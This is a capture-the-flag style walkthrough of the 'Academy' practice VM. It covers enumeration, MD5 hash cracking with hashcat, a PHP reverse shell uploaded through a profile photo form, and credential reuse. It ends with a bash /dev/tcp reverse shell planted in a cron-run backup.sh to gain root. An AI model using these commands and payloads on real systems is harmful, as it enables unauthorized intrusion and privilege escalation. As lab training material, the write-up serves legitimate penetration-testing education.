# Academy Walkthrough

## Enumeration
Login to the Academy VM with the credentials `root:tcm`and run `dhclient`. Run it again to confirm that the "file exists".
List out the IP address for this VM with `ip a`
![[Pasted image 20220223163407.png]]
Our nmap scan; remember to `export IP=<ip-address>`:
```bash
nmap -A -p -T4 $IP -oA $IP-academy-scan
```

![[Pasted image 20220223170217.png]]
We see that `ftp`, `ssh`, and an Apache web server that are all open.
Let's see what `ftp` has
![[Pasted image 20220223170920.png]]
`cat note.txt` and we have a password hash:
![[Pasted image 20220223171715.png]]
Using `hashidentifier`, try to find out what type of hash it is.
![[Pasted image 20220223171844.png]]
It tells us that it is an MD5 hash so go out to Google and search how to crack the hash. Search terms should be like: "hashcat crack md5 hash" and open the first link: https://www.4armed.com/blog/hashcat-crack-md5-hashes/
`hashcat` is installed on Kali by default so save the hash like so:
`echo 'cd73502828457d15655bbd7a63fb0bc8' > hashes.txt`
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
After running that command, you should see it cracked.![[Pasted image 20220223172239.png]]
We see that the password was "student".
## Directory Busting
Now time to figure out what directories are available to us.
With `dirb` we can try to search through a default list like so:
```bash
dirb http://$IP
```
and also with `ffuf`(not installed by default so `sudo apt install ffuf`) we can "fuzz" for directories (Make sure to replace the IP address with your own target IP):
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.122.53/FUZZ
```
We see that the directory "academy" so let's go check it out:
![[Pasted image 20220223174036.png]]
We need a Reg no and the password so go back to the note and copy the reg no from there. Use these credentials: `10201321:student`

We arrive to a "STUDENT CHANGE PASSWORD" tab but what is more intersting is the "/academy/my-profile.php" tab. There a section where we can upload an image. Click on `Browse...` and browse to an image you have (or search for one online). Click on `Update` and the page should refresh. Right click on the image and select `Open Image in New Tab` or `Copy Image Link`. We now know where the images will be saved at: http://IP-ADDRESS/academy/studentphoto/sudoheader.png

Since we know that the app uses PHP to upload the image, we will need a php reverse shell so that we can get code execution on the server. Search on Google for "php reverse shell" and you should find from the first hit on GitHub: https://github.com/pentestmonkey/php-reverse-shell

Copy or download `php-reverse-shell.php` in your directory of choice using `wget` like so. You can grab that link by clicking on the "Raw" button and copying the link. We'll save it as `shell.php` using `-O` shown below:
```bash
wget 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -O shell.php
```
Using `vim`, `nano`, `mousepad`, or any editor of choice, change `$ip` to your attack box IP. You can check your IP using `ip a` and looking at your `inet` address. You can also leave `$port` alone.

Now on the attack box, run: `nc -lvnp 1234` or whatever port you have saved in the `shell.php` and go back the the "Upload New Photo" section and browse to where you have saved `shell.php`. Upon clicking on `Update`, the page will hang and going back to our listener, we can see that we have a shell. Strangely enough, we can't use `sudo`:
![[Pasted image 20220223182755.png]]
`cd /tmp`: change directory into tmp and start our web server from the home directory on our attack machine like so:
```bash
python3 -m http.server 80
```
Back to our shell, download the file using `wget`:
![[Pasted image 20220223184340.png]]
`chmod +x linpeas.sh` and run with
`./linpeas.sh`
Look for anything in YELLOW/RED or RED, these are going to be important on any pentest. We found something at `/home/grimmie/backup.sh`:
![[Pasted image 20220223184726.png]]
Linpeas also found this, which might be interesting later on:
![[Pasted image 20220223185002.png]]
`$mysql_password = "My_V3ryS3cur3_P4ss";` 
`cat /var/www/html/academy/includes/config.php` output:
![[Pasted image 20220223190133.png]]
`grimmie`: has administrator access??
![[Pasted image 20220223190354.png]]

Let's try to login with `ssh` using grimmie's password
```bash
ssh grimmie@192.168.122.53
```
enter "yes" to accept and enter the password "My_V3ryS3cur3_P4ss"
![[Pasted image 20220223190912.png]]
Trying out some commands don't reveal anything useful
![[Pasted image 20220223191627.png]]
So go out to Google and search for "pspy" where the first link will be a GitHub repo: https://github.com/DominicBreuker/pspy
We want the "64 bit, static version" called `pspy64` so click on it to download and move it to our home or whatever folder we are using to transfer to Academy VM (`transfers`folder in our case).
![[Pasted image 20220223192227.png]]
`backup.sh` is running every minute as can be shown after executing `./pspy64`, you just have to wait to see it.
![[Pasted image 20220223192448.png]]
Go back to where `backup.sh` is located in `/home/grimmie` and search on Google for
"bash reverse shell one liner". The first link is what we are looking for: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Copy/paste the first command we see 
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` we will modify it a bit for our use case by replacing the `10.0.0.1` part to our attack IP and the port part to something like `8081`.
Start a reverse shell listener on our attack box:
```bash
nc -lvnp 8081
```
and on the ssh shell, we will need to modify `backup.sh` like so:
![[Pasted image 20220223195419.png]]
```bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.122.31/8081 0>&1
```
Wait a minute while the `backup.sh` executes and back on the listener, we have our flag.
![[Pasted image 20220223195806.png]]
